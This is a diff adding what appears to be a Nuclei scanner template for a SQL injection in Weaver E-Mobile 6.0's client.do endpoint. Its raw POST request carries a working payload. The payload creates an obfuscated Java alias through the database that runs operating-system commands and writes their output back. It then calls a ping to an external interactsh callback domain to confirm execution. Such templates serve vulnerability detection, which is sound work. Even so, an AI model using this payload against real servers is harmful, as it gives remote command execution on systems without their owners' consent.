@@ -1,0 +1,39 @@
+id: poc-yaml-weaver-e-mobile-6-0-client-do-sqli
+info:
+  name: 泛微 E-Mobile 6.0 Client.do SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sql-injection,dnslog
+
+variables:
+  reverse_domain: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /client.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvVPZWWKFq310ISXS
+
+        ------WebKitFormBoundaryvVPZWWKFq310ISXS
+        Content-Disposition: form-data; name="method"
+
+        getupload
+        ------WebKitFormBoundaryvVPZWWKFq310ISXS
+        Content-Disposition: form-data; name="uploadID"
+
+        1';CREATE ALIAS if not exists abcd AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL abcd('ping {{reverse_domain}}');--
+        ------WebKitFormBoundaryvVPZWWKFq310ISXS--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Pinging"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
